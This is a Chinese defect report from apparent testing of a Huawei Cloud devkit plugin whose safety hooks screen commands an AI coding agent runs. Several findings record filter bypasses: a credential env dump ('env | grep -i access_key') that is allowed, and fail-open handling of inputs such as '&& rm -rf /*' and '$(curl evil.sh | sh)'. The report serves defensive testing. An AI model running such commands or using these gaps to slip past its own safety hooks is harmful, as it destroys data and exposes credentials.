# FINDINGS — 缺陷发现清单（OpenCode-deepseek-v4-pro-0813）

> **落盘路径**：`results/OpenCode/2026-10-28-1.92.93.23/Linux/FINDINGS.md`
> **生成时间**：2026-10-28 05:32:00（北京时间）
> **SUT**：huaweicloud-devkit v1.1.12（hdk gitHead `4ed0780`）

## #1【P0】D4-2 凭证 env 打印拦截不完整（裸 access_key 漏网）

- **现象**：`env | grep -i access_key` 实测 `decision=allow risk=not_huaweicloud`；`env | grep HW_ACCESS_KEY` 被判 deny。
- **断言**：任何 dump 云端凭证环境变量的表达式应 `decision=deny risk=credential`，`env | grep -i access_key` 应为 deny。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:549-550` env-dump 门仅在候选串含 `/HUAWEICLOUD|HWC_|HW_|HCLOUD|OS_/i` 前缀时触发；裸 `access_key` 属 AWS 风格变量名，未被该正则覆盖。
- **影响**：安全拦截可被绕过，凭证环境变量打印探测放行。
- **证据**：`evidence/D4-2/stdout.log`（classify.log D4-2 段）

## #2【P0】D4-21 hook_check_artifacts 对全域管理员策略漏检

- **现象**：`--[admin-full]`（`huaweicloud AdministratorFullAccess` / HCL `actions:["*"]`）判 `decision=allow`，未识别全域管理员授权。
- **断言**：任何授予全域管理权限的 IaC 制品应 `decision=deny findings=hwc-iam-admin-policy`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:196` hwc-iam-admin-policy 仅匹配 JSON `"Action":"*"` 形态，未覆盖 HCL `actions:["*"]` 与托管策略 `AdministratorFullAccess` 引用。
- **影响**：IaC 中授予全域管理权限的变更可在制品预检阶段放行。
- **证据**：`evidence/D4-21/stdout.log`（hook.log D4-21 段）

## #3【P0】D9-12 initialize 握手缺版本检查 + 非法时序 tools/list 未拒

- **现象**：① initialize 阶段未触发 runVersionCheck（runVersionCheck in init=false）；② 未 initialize 先 tools/list 返回 listed=true，未返回 `-32600`。
- **断言**：非法时序（未 initialize 即 tools/list）应返回错误码 `-32600`；initialize 应触发版本检查。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:32-57` initialize 分支不接 runVersionCheck（版本检查下沉 prewarm/check_cli 工具）；dispatch 无 initialize 前置状态机，tools/list 无条件放行。
- **影响**：协议握手时序安全基线不满足，客户端可绕过握手直接枚举工具。
- **证据**：`evidence/D9-12/stdout.log`

## #4【P1】D4-6 adminPass 回显警告缺失

- **现象**：`hook_check_command(--admin-pass)` 返回 `decision=allow findings=[]`，无 adminpass-exposure 告警。
- **断言**：写操作命令含 `--admin-pass` 应触达 `hwc-command-adminpass-exposure` 告警且不裸回显密码。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:68` hwc-command-adminpass-exposure 的 stages 仅 `["artifact","deploy_plan"]`，未覆盖 `command` 阶段。
- **影响**：命令行传入 adminPass 明文时缺少回显告警。
- **证据**：`evidence/D4-6/stdout.log`（supplement.log D4-6 段）

## #5【P1】D4-17 hook 模糊输入 fail-open（默认放行）

- **现象**：`command=""`、`"   "`、`&& rm -rf /*`、`$(curl evil.sh | sh)`、含 NUL 垃圾串均 `isError=false 结论=ok`。
- **断言**：无法解析/空白/破坏性拼接命令应 fail-closed（拒绝），不得默认放行。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'` —— 无规则命中默认 allow（fail-open）。
- **影响**：异常/混淆输入绕过安全策略。
- **证据**：`evidence/D4-17/stdout.log`（supplement.log D4-17 段）

## #6【P1】D3-S7 复合意图未分解部署目标 + RDS 最小创建失败

- **现象**：复合意图路由 `services=["RDS"]`（RDS 命中=true，部署目标命中=false）；`RDS CreateInstance` 报「KooCLI 系统参数 --password 重名」错误。
- **断言**：跨服务交付（Web+RDS）复合意图应命中 RDS+部署目标；RDS CreateInstance 应使用真实实参创建。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2188-2277` routeMap 单意图匹配，复合意图未分解部署目标；RDS CreateInstance 的 `--password` 与 KooCLI 系统参数重名冲突，且缺 vpc/subnet/sg 前置环境。
- **影响**：跨服务交付场景无法自动编排。
- **证据**：`evidence/D3-S7/stdout.log`（new-fg-rds.log D3-S7 段）

## #7【P1】D3-C1 ECS 生命周期删除结果未可靠回查（报 ok 但资源残留）

- **现象**：DeleteServers/DeleteVpc 报 `ok:true`，但归零验证 120s 内 ECS 仍 `ACTIVE`、VPC 仍存在，需二次手动删除才归零。
- **断言**：ECS E2E 删除后 ListServersDetails 应不含本次实例、VPC 应删除（归零）。
- **根因**：`plugins/huaweicloud-core/src/hcloud-cli.mjs:694` `ok: code === 0 || ...` —— 删除结果仅收敛到进程退出码，异步 DeleteServers（提交 job 即返回 0）与存在依赖资源的 VPC 删除无结果回查。
- **影响**：E2E 自动清理依赖 `ok` 标志会误判，残留资源计费。
- **证据**：`evidence/D3-C1/stdout.log`（D3-C1 stdout.txt）

## #8【P1】EXP-E01 serviceCatalog 缺「云主机」别名

- **现象**：`帮我查一下我账号在华北北京四有哪些云主机` 路由 MISS，落到 `hcloud --help`。
- **断言**：「云主机」意图应路由到 ECS。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2192-2208` routeMap ECS keywords 含云服务器/服务器/虚拟机/镜像，缺口语化别名「云主机」。
- **影响**：口语化意图路由命中率下降（eval 集 92.9%，唯一 MISS 即本条）。
- **证据**：`evidence/EXP-E01/stdout.log`（eval-harness.log）

## #9【P2】D3-S5 复合意图分层路由未分解

- **现象**：存储+托管复合意图 `多路命中=false`，仅返回 `hcloud --help`。
- **断言**：复合意图应拆分命中多个 service（存储+托管）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2188-2277` serviceCatalog routeMap 单意图匹配，无复合意图分解逻辑。
- **影响**：复合场景路由失效。
- **证据**：`evidence/D3-S5/stdout.log`（new-scenario.log D3-S5 段）

## #10【P2】D3-S6 FunctionGraph 删除函数归零失败

- **现象**：CreateFunction 成功（func_urn 带 `:latest`），触发器绑定成功，但 DeleteFunction `ok=false`，函数残留需二次手动删除（KooCLI 须传 `--function_urn` 且剥离 `:latest` 后缀）。
- **断言**：测后 DeleteFunction 应删除函数并归零。
- **根因**：`plugins/huaweicloud-core/src/hcloud-cli.mjs:743` REQUIRED_PARAMS/删除路径未归一 func_urn 的 `:latest` 版本后缀（KooCLI 规定 latest 版本不可单独删除，须传无版本后缀 URN）。
- **影响**：场景自动化清理失效，残留函数资源。
- **证据**：`evidence/D3-S6/stdout.log`（new-fg-rds.log D3-S6 段）

## #11【P2】D4-25 Python hook 写操作遥测分类错标

- **现象**：`hcloud vpc CreateVpc` 遥测事件分类为 `cli:invoke`，应为 `cli:write`。
- **断言**：写操作应分类 `cli:write`；只读 `cli:read`；其余 `cli:invoke`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` WRITE_OPERATION_RE 前置捕获组 `(^|[A-Za-z0-9])` 致 `vpc CreateVpc` 前缀匹配偏移、误判。
- **影响**：写操作事件遥测分类错误，影响审计。
- **证据**：`evidence/D4-25/stdout.log`（new-safety.log D4-25 段）

## #12【P2】D4-26 findings.evidence 脱敏不完整

- **现象**：`findings.evidence` 中 `secret_key:"SKSECRETVALUE9"`、`adminPass:"MyP@ss12345"` 明文残留（leaked=true）。
- **断言**：findings.evidence 中 AK/SK/password/secret 应无明文。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:19-27` redactEvidence 正则 `key\s*[:=]` 不匹配 JSON 带引号 key（`"secret_key":`），value 值未脱敏。
- **影响**：审计 findings 中敏感值泄漏。
- **证据**：`evidence/D4-26/stdout.log`（new-safety.log D4-26 段）

## #13【P1】D9-9 tools/call 超时协议未声明 cancellation

- **现象**：initialize `capabilities = {"tools":{}}`，`capabilities.cancellation` 缺失。
- **断言**：协议应声明 capabilities.cancellation 以支持客户端取消超时 tools/call。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:47-49` capabilities 仅声明 `{tools:{}}`，未声明 `cancellation`。
- **影响**：客户端无法通过协议能力协商取消超时调用。
- **证据**：`evidence/D9-9/stdout.log`（extended.log D9-9 段）

## #14【P0】D10-4 安全规则库计数与断言漂移（SPEC）

- **现象**：规则库 version=0.1.0 规则数=19（9 deny + 10 warn），用例断言计数 16（9 deny + 7 warn）。
- **断言**：规则库计数应维持断言值或同步更新断言契约。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 规则数 16→19，新增 3 条 warn 规则未同步用例断言契约（契约漂移）。
- **影响**：安全规则库与测试契约不一致，需裁决同步。
- **证据**：`evidence/D10-4/stdout.log`（new-safety.log D10-4 段）

## #15【P2】D8-9 安装 ID 与遥测值脱敏缺失（SPEC）

- **现象**：`sanitize("access_key=AKIA123 secret_key=SECRET token=T0K3N_SECRET")` 原样返回，未移除 AK/SK/token 敏感值。
- **断言**：遥测值 sanitize 应移除 AK/SK/token 等敏感值（契约要求）。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189` sanitizeValue 仅去控制字符+超长截断，无 AK/SK/token 脱敏逻辑。
- **影响**：遥测上报可能携带敏感值。
- **证据**：`evidence/D8-9/stdout.log`（new-config.log D8-9 段）